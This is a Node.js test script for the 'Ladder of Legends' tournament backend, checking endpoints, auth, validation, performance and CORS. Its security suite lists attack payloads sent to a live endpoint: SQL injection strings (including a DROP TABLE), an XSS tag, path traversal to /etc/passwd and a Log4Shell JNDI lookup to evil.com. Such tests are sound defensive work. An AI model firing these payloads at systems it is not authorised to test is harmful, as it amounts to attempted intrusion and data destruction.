#!/usr/bin/env node

/**
 * COMPREHENSIVE PRODUCTION READINESS TEST
 * 
 * This script tests all aspects of the Ladder of Legends system
 * for production readiness, including API endpoints, error handling,
 * security vulnerabilities, and edge cases.
 */

import https from 'https';
import http from 'http';

// Configuration
const BACKEND_URL = "https://atlasbackend-bnng.onrender.com";
const TEST_RESULTS = [];
let TOTAL_TESTS = 0;
let PASSED_TESTS = 0;
let FAILED_TESTS = 0;
let CRITICAL_ISSUES = 0;

// Test Categories
const CATEGORIES = {
  API_ENDPOINTS: 'API Endpoints',
  AUTHENTICATION: 'Authentication & Security',
  INPUT_VALIDATION: 'Input Validation',
  ERROR_HANDLING: 'Error Handling', 
  BUSINESS_LOGIC: 'Business Logic',
  PERFORMANCE: 'Performance',
  INTEGRATION: 'Third-party Integration'
};

// Color codes for terminal output
const colors = {
  red: '\x1b[31m',
  green: '\x1b[32m',
  yellow: '\x1b[33m',
  blue: '\x1b[34m',
  magenta: '\x1b[35m',
  cyan: '\x1b[36m',
  white: '\x1b[37m',
  reset: '\x1b[0m',
  bright: '\x1b[1m'
};

// Utility functions
const log = (message, color = 'white') => {
  console.log(`${colors[color]}${message}${colors.reset}`);
};

const logSection = (title) => {
  console.log(`\n${colors.bright}${colors.cyan}${'='.repeat(60)}${colors.reset}`);
  console.log(`${colors.bright}${colors.cyan}${title}${colors.reset}`);
  console.log(`${colors.bright}${colors.cyan}${'='.repeat(60)}${colors.reset}\n`);
};

const logTest = (testName, status, details = '') => {
  TOTAL_TESTS++;
  const statusColor = status === 'PASS' ? 'green' : status === 'FAIL' ? 'red' : 'yellow';
  const icon = status === 'PASS' ? '✅' : status === 'FAIL' ? '❌' : '⚠️ ';
  
  if (status === 'PASS') PASSED_TESTS++;
  else if (status === 'FAIL') FAILED_TESTS++;
  
  if (status === 'FAIL' && (testName.includes('CRITICAL') || testName.includes('SECURITY'))) {
    CRITICAL_ISSUES++;
  }
  
  log(`${icon} ${testName}: ${status}`, statusColor);
  if (details) log(`   ${details}`, 'white');
  
  TEST_RESULTS.push({ testName, status, details, category: 'General' });
};

// HTTP request helper
const makeRequest = (url, options = {}) => {
  return new Promise((resolve, reject) => {
    const protocol = url.startsWith('https') ? https : http;
    const timeoutMs = options.timeout || 10000;
    
    const req = protocol.request(url, {
      method: options.method || 'GET',
      headers: {
        'Content-Type': 'application/json',
        'User-Agent': 'Production-Readiness-Test/1.0',
        ...options.headers
      },
      timeout: timeoutMs
    }, (res) => {
      let data = '';
      res.on('data', chunk => data += chunk);
      res.on('end', () => {
        try {
          const jsonData = data ? JSON.parse(data) : {};
          resolve({
            statusCode: res.statusCode,
            headers: res.headers,
            data: jsonData,
            rawData: data
          });
        } catch (e) {
          resolve({
            statusCode: res.statusCode,
            headers: res.headers,
            data: null,
            rawData: data,
            parseError: true
          });
        }
      });
    });
    
    req.on('timeout', () => {
      req.destroy();
      reject(new Error(`Request timeout after ${timeoutMs}ms`));
    });
    
    req.on('error', reject);
    
    if (options.body) {
      req.write(typeof options.body === 'string' ? options.body : JSON.stringify(options.body));
    }
    
    req.end();
  });
};

// Test Suite 1: API Endpoint Availability
const testApiEndpoints = async () => {
  logSection('🔌 API ENDPOINT AVAILABILITY TEST');
  
  const endpoints = [
    // Ladder Core Endpoints
    { path: '/api/ladder/ladders/499-under/players', method: 'GET', critical: true },
    { path: '/api/ladder/ladders/500-549/players', method: 'GET', critical: true },
    { path: '/api/ladder/ladders/550-plus/players', method: 'GET', critical: true },
    { path: '/api/ladder/player-status/test@example.com', method: 'GET', critical: true },
    
    // Challenge Endpoints
    { path: '/api/ladder/challenge', method: 'POST', critical: true },
    { path: '/api/ladder/challenges/pending/test@example.com', method: 'GET', critical: true },
    { path: '/api/ladder/challenges/sent/test@example.com', method: 'GET', critical: true },
    
    // Admin Endpoints
    { path: '/api/ladder/applications', method: 'GET', critical: false },
    { path: '/api/ladder/admin/499-under', method: 'GET', critical: false },
    { path: '/api/ladder/players', method: 'GET', critical: false },
    
    // Prize Pool Endpoints
    { path: '/api/ladder/prize-pool/499-under', method: 'GET', critical: true },
    { path: '/api/ladder/prize-pool/499-under/history', method: 'GET', critical: false },
    { path: '/api/ladder/prize-pool/499-under/winners', method: 'GET', critical: false },
    
    // Authentication & User Endpoints
    { path: '/api/users/test@example.com', method: 'GET', critical: true },
    { path: '/api/ladder/claim-account', method: 'POST', critical: true },
    { path: '/api/ladder/apply-for-existing-ladder-account', method: 'POST', critical: true },
    
    // Monetization Endpoints
    { path: '/api/monetization/membership/test@example.com', method: 'GET', critical: true },
    { path: '/api/monetization/payment-methods', method: 'GET', critical: true },
    { path: '/api/monetization/tiers', method: 'GET', critical: false },
    
    // Email & Communication
    { path: '/api/email/send-challenge-confirmation', method: 'POST', critical: false },
    
    // Match Reporting
    { path: '/api/challenges/pending/testuser/499-under', method: 'GET', critical: true },
    { path: '/api/challenges/report-result', method: 'POST', critical: true }
  ];
  
  for (const endpoint of endpoints) {
    try {
      const response = await makeRequest(`${BACKEND_URL}${endpoint.path}`, {
        method: endpoint.method,
        timeout: 5000
      });
      
      if (response.statusCode === 404) {
        logTest(
          `${endpoint.critical ? 'CRITICAL' : 'NON-CRITICAL'} ENDPOINT: ${endpoint.method} ${endpoint.path}`,
          'FAIL',
          `Endpoint not found (404). This endpoint is ${endpoint.critical ? 'REQUIRED' : 'optional'} for production.`
        );
      } else if (response.statusCode >= 500) {
        logTest(
          `ENDPOINT: ${endpoint.method} ${endpoint.path}`,
          'FAIL',
          `Server error (${response.statusCode}). Backend may be down or misconfigured.`
        );
      } else if (response.statusCode === 401 || response.statusCode === 403) {
        logTest(
          `ENDPOINT: ${endpoint.method} ${endpoint.path}`,
          'PASS',
          `Authentication required (${response.statusCode}) - Security working correctly.`
        );
      } else {
        logTest(
          `ENDPOINT: ${endpoint.method} ${endpoint.path}`,
          'PASS',
          `Responds with ${response.statusCode}`
        );
      }
    } catch (error) {
      logTest(
        `${endpoint.critical ? 'CRITICAL' : ''} ENDPOINT: ${endpoint.method} ${endpoint.path}`,
        'FAIL',
        `Network error: ${error.message}`
      );
    }
  }
};

// Test Suite 2: Authentication & Security
const testAuthentication = async () => {
  logSection('🔐 AUTHENTICATION & SECURITY TEST');
  
  // Test 1: SQL Injection attempts
  const sqlInjectionPayloads = [
    "' OR '1'='1",
    "'; DROP TABLE users; --",
    "' UNION SELECT * FROM users --",
    "<script>alert('xss')</script>",
    "../../../etc/passwd",
    "${jndi:ldap://evil.com/a}"
  ];
  
  for (const payload of sqlInjectionPayloads) {
    try {
      const response = await makeRequest(`${BACKEND_URL}/api/ladder/player-status/${encodeURIComponent(payload)}`, {
        timeout: 3000
      });
      
      if (response.rawData && response.rawData.includes(payload)) {
        logTest(
          'SECURITY CRITICAL: SQL Injection Protection',
          'FAIL',
          `Payload "${payload}" was reflected in response - potential vulnerability!`
        );
      } else {
        logTest(
          'SECURITY: SQL Injection Protection',
          'PASS',
          `Payload "${payload.substring(0, 20)}..." properly handled`
        );
      }
    } catch (error) {
      logTest(
        'SECURITY: SQL Injection Protection',
        'PASS',
        `Request properly rejected or timed out`
      );
    }
  }
  
  // Test 2: Authentication bypass attempts
  const authBypassTests = [
    { path: '/api/ladder/admin/499-under', expectedMinStatus: 401 },
    { path: '/api/ladder/applications', expectedMinStatus: 401 },
    { path: '/api/ladder/players', expectedMinStatus: 401 }
  ];
  
  for (const test of authBypassTests) {
    try {
      const response = await makeRequest(`${BACKEND_URL}${test.path}`, { timeout: 3000 });
      
      if (response.statusCode < test.expectedMinStatus) {
        logTest(
          'SECURITY CRITICAL: Authentication Bypass',
          'FAIL',
          `${test.path} accessible without authentication (${response.statusCode})`
        );
      } else {
        logTest(
          'SECURITY: Authentication Protection',
          'PASS',
          `${test.path} properly protected (${response.statusCode})`
        );
      }
    } catch (error) {
      logTest(
        'SECURITY: Authentication Protection',
        'WARN',
        `Could not test ${test.path}: ${error.message}`
      );
    }
  }
};

// Test Suite 3: Input Validation
const testInputValidation = async () => {
  logSection('🔍 INPUT VALIDATION TEST');
  
  // Test oversized inputs
  const largeString = 'A'.repeat(10000);
  const testInputs = [
    { name: 'Oversized Email', value: largeString + '@example.com' },
    { name: 'Invalid Email Format', value: 'notanemail' },
    { name: 'Null Input', value: null },
    { name: 'Empty String', value: '' },
    { name: 'Special Characters', value: '!@#$%^&*()_+{}[]|\\:";\'<>?,./' },
    { name: 'Unicode Characters', value: '🎱🏆⚔️💰📊' },
    { name: 'Very Long Number', value: '9'.repeat(100) },
    { name: 'Negative Number', value: '-999999' }
  ];
  
  for (const input of testInputs) {
    try {
      const response = await makeRequest(`${BACKEND_URL}/api/ladder/claim-account`, {
        method: 'POST',
        body: {
          firstName: input.value,
          lastName: input.value,
          email: input.value,
          pin: input.value
        },
        timeout: 3000
      });
      
      if (response.statusCode === 400) {
        logTest(
          `INPUT VALIDATION: ${input.name}`,
          'PASS',
          'Properly rejected invalid input with 400 status'
        );
      } else if (response.statusCode >= 500) {
        logTest(
          `INPUT VALIDATION: ${input.name}`,
          'FAIL',
          `Server error (${response.statusCode}) - input may have caused crash`
        );
      } else {
        logTest(
          `INPUT VALIDATION: ${input.name}`,
          'WARN',
          `Unexpected response (${response.statusCode}) - validation may be incomplete`
        );
      }
    } catch (error) {
      if (error.message.includes('timeout')) {
        logTest(
          `INPUT VALIDATION: ${input.name}`,
          'FAIL',
          'Request timed out - input may have caused server hang'
        );
      } else {
        logTest(
          `INPUT VALIDATION: ${input.name}`,
          'PASS',
          'Request properly rejected'
        );
      }
    }
  }
};

// Test Suite 4: Race Conditions & Concurrent Operations
const testConcurrentOperations = async () => {
  logSection('⚡ CONCURRENT OPERATIONS TEST');
  
  // Test concurrent ladder position requests
  logTest('CONCURRENCY: Simultaneous API Calls', 'TESTING', 'Starting concurrent request test...');
  
  const concurrentRequests = Array(5).fill().map(async (_, i) => {
    try {
      const start = Date.now();
      const response = await makeRequest(`${BACKEND_URL}/api/ladder/ladders/499-under/players`, {
        timeout: 10000
      });
      const duration = Date.now() - start;
      
      return {
        index: i,
        statusCode: response.statusCode,
        duration,
        success: response.statusCode < 400
      };
    } catch (error) {
      return {
        index: i,
        error: error.message,
        success: false
      };
    }
  });
  
  try {
    const results = await Promise.all(concurrentRequests);
    const successCount = results.filter(r => r.success).length;
    const avgDuration = results
      .filter(r => r.duration)
      .reduce((sum, r) => sum + r.duration, 0) / results.length;
    
    if (successCount === 5) {
      logTest(
        'CONCURRENCY: Simultaneous API Calls',
        'PASS',
        `All 5 concurrent requests succeeded. Avg response time: ${Math.round(avgDuration)}ms`
      );
    } else {
      logTest(
        'CONCURRENCY: Simultaneous API Calls',
        'FAIL',
        `Only ${successCount}/5 concurrent requests succeeded`
      );
    }
  } catch (error) {
    logTest(
      'CONCURRENCY: Simultaneous API Calls',
      'FAIL',
      `Concurrent operations failed: ${error.message}`
    );
  }
};

// Test Suite 5: Performance & Load
const testPerformance = async () => {
  logSection('🚀 PERFORMANCE TEST');
  
  // Test response times for critical endpoints
  const criticalEndpoints = [
    '/api/ladder/ladders/499-under/players',
    '/api/ladder/player-status/test@example.com',
    '/api/ladder/prize-pool/499-under'
  ];
  
  for (const endpoint of criticalEndpoints) {
    try {
      const start = Date.now();
      const response = await makeRequest(`${BACKEND_URL}${endpoint}`, { timeout: 30000 });
      const duration = Date.now() - start;
      
      if (duration > 5000) {
        logTest(
          `PERFORMANCE: ${endpoint}`,
          'FAIL',
          `Response time ${duration}ms > 5000ms threshold`
        );
      } else if (duration > 2000) {
        logTest(
          `PERFORMANCE: ${endpoint}`,
          'WARN',
          `Response time ${duration}ms > 2000ms (acceptable but slow)`
        );
      } else {
        logTest(
          `PERFORMANCE: ${endpoint}`,
          'PASS',
          `Response time: ${duration}ms`
        );
      }
    } catch (error) {
      logTest(
        `PERFORMANCE: ${endpoint}`,
        'FAIL',
        `Request failed: ${error.message}`
      );
    }
  }
};

// Test Suite 6: Error Handling
const testErrorHandling = async () => {
  logSection('🚨 ERROR HANDLING TEST');
  
  // Test various error conditions
  const errorTests = [
    {
      name: 'Non-existent Ladder',
      url: '/api/ladder/ladders/non-existent/players',
      expectedStatus: [400, 404]
    },
    {
      name: 'Malformed JSON Request',
      url: '/api/ladder/claim-account',
      method: 'POST',
      body: 'invalid json{',
      expectedStatus: [400]
    },
    {
      name: 'Missing Required Fields',
      url: '/api/ladder/claim-account',
      method: 'POST',
      body: {},
      expectedStatus: [400]
    },
    {
      name: 'Invalid Challenge ID',
      url: '/api/ladder/challenge/invalid-id/accept',
      method: 'POST',
      expectedStatus: [400, 404]
    }
  ];
  
  for (const test of errorTests) {
    try {
      const options = {
        method: test.method || 'GET',
        timeout: 5000
      };
      
      if (test.body) {
        options.body = test.body;
        options.headers = { 'Content-Type': 'application/json' };
      }
      
      const response = await makeRequest(`${BACKEND_URL}${test.url}`, options);
      
      if (test.expectedStatus.includes(response.statusCode)) {
        logTest(
          `ERROR HANDLING: ${test.name}`,
          'PASS',
          `Properly returned ${response.statusCode} status`
        );
      } else {
        logTest(
          `ERROR HANDLING: ${test.name}`,
          'WARN',
          `Unexpected status ${response.statusCode}, expected one of: ${test.expectedStatus.join(', ')}`
        );
      }
    } catch (error) {
      logTest(
        `ERROR HANDLING: ${test.name}`,
        'WARN',
        `Request failed: ${error.message}`
      );
    }
  }
};

// Test Suite 7: Frontend Integration Points
const testFrontendIntegration = async () => {
  logSection('🎨 FRONTEND INTEGRATION TEST');
  
  // Test CORS headers
  try {
    const response = await makeRequest(`${BACKEND_URL}/api/ladder/ladders/499-under/players`, {
      headers: {
        'Origin': 'https://newapp-1-ic1v.onrender.com'
      },
      timeout: 5000
    });
    
    if (response.headers['access-control-allow-origin']) {
      logTest(
        'INTEGRATION: CORS Headers',
        'PASS',
        `CORS properly configured: ${response.headers['access-control-allow-origin']}`
      );
    } else {
      logTest(
        'INTEGRATION: CORS Headers',
        'FAIL',
        'Missing CORS headers - frontend requests will fail'
      );
    }
  } catch (error) {
    logTest(
      'INTEGRATION: CORS Headers',
      'FAIL',
      `Could not test CORS: ${error.message}`
    );
  }
  
  // Test Content-Type handling
  try {
    const response = await makeRequest(`${BACKEND_URL}/api/ladder/ladders/499-under/players`, {
      timeout: 5000
    });
    
    if (response.headers['content-type'] && response.headers['content-type'].includes('application/json')) {
      logTest(
        'INTEGRATION: JSON Content-Type',
        'PASS',
        `Proper JSON content-type: ${response.headers['content-type']}`
      );
    } else {
      logTest(
        'INTEGRATION: JSON Content-Type',
        'WARN',
        `Unexpected content-type: ${response.headers['content-type'] || 'none'}`
      );
    }
  } catch (error) {
    logTest(
      'INTEGRATION: JSON Content-Type',
      'FAIL',
      `Could not test content-type: ${error.message}`
    );
  }
};

// Generate Final Report
const generateFinalReport = () => {
  logSection('📊 PRODUCTION READINESS ASSESSMENT REPORT');
  
  const passRate = ((PASSED_TESTS / TOTAL_TESTS) * 100).toFixed(1);
  const failRate = ((FAILED_TESTS / TOTAL_TESTS) * 100).toFixed(1);
  
  log(`\n📈 OVERALL STATISTICS:`, 'bright');
  log(`   Total Tests Run: ${TOTAL_TESTS}`, 'white');
  log(`   Passed: ${PASSED_TESTS} (${passRate}%)`, 'green');
  log(`   Failed: ${FAILED_TESTS} (${failRate}%)`, 'red');
  log(`   Critical Issues: ${CRITICAL_ISSUES}`, CRITICAL_ISSUES > 0 ? 'red' : 'green');
  
  // Production Readiness Score
  let productionScore = 0;
  if (CRITICAL_ISSUES === 0) productionScore += 40;
  if (passRate >= 80) productionScore += 30;
  if (passRate >= 90) productionScore += 20;
  if (FAILED_TESTS === 0) productionScore += 10;
  
  log(`\n🏆 PRODUCTION READINESS SCORE: ${productionScore}/100`, 
      productionScore >= 80 ? 'green' : productionScore >= 60 ? 'yellow' : 'red');
  
  // Recommendations
  log(`\n💡 RECOMMENDATIONS:`, 'bright');
  
  if (CRITICAL_ISSUES > 0) {
    log(`   🚨 CRITICAL: Fix ${CRITICAL_ISSUES} critical security/functionality issues before production`, 'red');
  }
  
  if (passRate < 80) {
    log(`   ⚠️  HIGH: Improve test pass rate from ${passRate}% to at least 80%`, 'yellow');
  }
  
  if (FAILED_TESTS > 5) {
    log(`   ⚠️  MEDIUM: Address ${FAILED_TESTS} failed tests for stability`, 'yellow');
  }
  
  // Final verdict
  log(`\n🎯 FINAL VERDICT:`, 'bright');
  
  if (productionScore >= 80 && CRITICAL_ISSUES === 0) {
    log(`   ✅ READY FOR PRODUCTION`, 'green');
    log(`   System shows strong production readiness with minimal issues.`, 'white');
  } else if (productionScore >= 60 && CRITICAL_ISSUES <= 2) {
    log(`   ⚠️  READY FOR BETA/STAGING`, 'yellow');
    log(`   System can handle limited users but needs improvements for full production.`, 'white');
  } else {
    log(`   ❌ NOT READY FOR PRODUCTION`, 'red');
    log(`   Significant issues found that could impact users or security.`, 'white');
  }
  
  log(`\n📋 NEXT STEPS:`, 'bright');
  log(`   1. Review all FAILED tests above`, 'white');
  log(`   2. Fix any CRITICAL issues immediately`, 'white');
  log(`   3. Address WARN items for better stability`, 'white');
  log(`   4. Re-run this test after fixes`, 'white');
  log(`   5. Consider load testing with real users`, 'white');
};

// Main execution
const runAllTests = async () => {
  log(`${colors.bright}${colors.magenta}
╔══════════════════════════════════════════════════════════════╗
║                                                              ║
║        🧪 PRODUCTION READINESS TEST SUITE v1.0 🧪           ║
║                                                              ║
║         Testing Ladder of Legends Tournament System         ║
║                                                              ║
╚══════════════════════════════════════════════════════════════╝
${colors.reset}`);
  
  log(`\n🎯 Testing backend: ${BACKEND_URL}`, 'cyan');
  log(`⏰ Started: ${new Date().toISOString()}`, 'white');
  
  try {
    await testApiEndpoints();
    await testAuthentication();
    await testInputValidation();
    await testConcurrentOperations();
    await testPerformance();
    await testErrorHandling();
    await testFrontendIntegration();
  } catch (error) {
    log(`\n💥 Test suite crashed: ${error.message}`, 'red');
    process.exit(1);
  }
  
  generateFinalReport();
  
  log(`\n⏰ Completed: ${new Date().toISOString()}`, 'white');
  log(`📝 Full test log available above.`, 'white');
  
  // Exit with appropriate code
  process.exit(CRITICAL_ISSUES > 0 ? 2 : FAILED_TESTS > 0 ? 1 : 0);
};

// Run the tests immediately (ES module)
runAllTests().catch(error => {
  console.error('Fatal error running tests:', error);
  process.exit(3);
});

export {
  runAllTests,
  testApiEndpoints,
  testAuthentication,
  testInputValidation,
  testConcurrentOperations,
  testPerformance,
  testErrorHandling,
  testFrontendIntegration
};